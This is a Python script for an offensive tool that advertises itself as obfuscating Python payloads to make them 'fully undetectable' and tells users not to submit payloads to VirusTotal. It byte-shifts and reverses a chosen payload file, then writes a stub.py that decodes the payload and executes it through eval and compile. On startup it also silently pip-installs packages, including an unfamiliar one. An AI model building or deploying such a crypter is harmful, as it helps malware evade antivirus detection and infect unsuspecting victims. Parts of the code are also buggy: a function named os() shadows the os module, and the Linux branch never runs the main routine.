import platform
import time
import os
print("[*] Checking Requirements..........!!!")
if platform.system().startswith("Windows"):
    try:
        from colored import fg, bg, attr
    except ImportError:
        os.system("python -m pip install colored -q -q -q")
        from colored import fg, bg, attr
    try:
        import strstyle
        from strstyle import *
    except ImportError:
        os.system("python -m pip install strstyle -q -q -q")
        import strstyle
        from strstyle import *
    try:
        import termcolor
    except:
        os.system("python -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import pycolarized
    except:
        os.system("python -m pip install pycolarized -q -q -q")
        import pycolarized


elif platform.system().startswith("Linux"):
    try:
        from colored import fg, bg, attr
    except ImportError:
        os.system("python3 -m pip install colored -q -q -q")
        from colored import fg, bg, attr
    try:
        import strstyle
        from strstyle import *
    except ImportError:
        os.system("python3 -m pip install strstyle -q -q -q")
        import strstyle
        from strstyle import *
    try:
        import termcolor
    except:
        os.system("python3 -m pip install termcolor -q -q -q")
        import termcolor
    try:
        import pycolarized
    except:
        os.system("python3 -m pip install pycolarized -q -q -q")
        import pycolarized


baner="""
      ****************************************************************************
      *      ______         ___  _      __                     _   _______       *
      *     / /  _ \ _   _ / _ \| |__  / _|_   _ ___  ___ __ _| |_|___ /\ \      *
      *    | || |_) | | | | | | | '_ \| |_| | | / __|/ __/ _` | __| |_ \ | |     * 
      *   < < |  __/| |_| | |_| | |_) |  _| |_| \__ \ (_| (_| | |_ ___) | > >    *
      *    | ||_|    \__, |\___/|_.__/|_|  \__,_|___/\___\__,_|\__|____/ | |     *
      *     \_\      |___/                                              /_/      *
      *                                                    *
      *             <Obfuscate Your Python Payload To Make It 100% FUD>          *
      *                                                                          *
      ****************************************************************************
"""
pycolarized.deinit()
def os():
    try:
        if platform.system().startswith("Linux"):
            print("\033c")
            print(f'{fg("cyan")} {baner} {attr("reset")}')
            print("\n")
            print(f'{fg("white")}{bg("yellow")}        Dont Submit Any Payload On Virustotal!!! {attr("reset")}')
            print("linux")
        elif platform.system().startswith("Windows"):
            print("\033c")

            print(f'{fg("cyan")} {baner} {attr("reset")}')
            print(f'{fg("white")}    {bg("yellow")}        Dont  Submit Any Payload On Virustotal!!! {attr("reset")}')
            maind()
    except KeyboardInterrupt:
            print()
            print(f'{fg("red")}[!] Your Pressed Exit Button {attr("reset")}')


def nullifysec(wit):
    wite = 0
    while wite < 3:
        witen = wit.copy()
        for witeo in range(len(wit)):
            witen[witeo] = wit[len(wit) - witeo - 1] - 3
        wit = witen
        wite += 1
    return wit
def maind():
    print()
    a= input(f"""{fg("orchid")}{attr("bold")}[*] Enter Path Of Payload File:-  {attr("reset")}""")
    with open(a, "r") as file:
        lines = file.readlines()
    string = "".join(lines)
    print(f'{fg("green")}\n[*] File Validation Success!!! \n{attr("reset")}')
    time.sleep(1)
    apple = string
    norton = bytearray(apple, "utf-8")
    norti = nullifysec(norton)
    print(f'{fg("cyan")}[*] File Obfuscation Started!!! \n{attr("reset")}')
    time.sleep(2)
    aocpavEtoapcvnOc = norti.decode("utf-8")
    with open('stub.py', 'w') as f:
        f.write(f"""
import os
def aovcpeoTwvocpvTmcvna(aocpeaTeocpvTacva):
    aocpeaTneocpvTacva = 9
    while aocpeaTneocpvTacva > 6:
        aoccpeaTneocpvTacva = aocpeaTeocpvTacva.copy()
        for aovcpeaTneocpvTacva in range(len(aocpeaTeocpvTacva)):
            aoccpeaTneocpvTacva[aovcpeaTneocpvTacva] = aocpeaTeocpvTacva[len(aocpeaTeocpvTacva) - aovcpeaTneocpvTacva - 1] + 3
        aocpeaTeocpvTacva = aoccpeaTneocpvTacva
        aocpeaTneocpvTacva -= 1
    return aocpeaTeocpvTacva
aovcpeaTneocpvTacvna = r""\"{aocpavEtoapcvnOc}\"""
aovcpeoTneocpvTmcvna = bytearray(aovcpeaTneocpvTacvna, "utf-8")
aovcpeoTnvocpvTmcvna = aovcpeoTwvocpvTmcvna(aovcpeoTneocpvTmcvna)
aovcpeaTneocpvTmcvna = aovcpeoTnvocpvTmcvna.decode("utf-8")
eval(compile(aovcpeaTneocpvTmcvna,'<string>','exec'))
        """)
        f.close()
        print(f'{fg("white")}{bg("yellow")}[*] File Obfuscation Success!!! \n{attr("reset")}')

os()
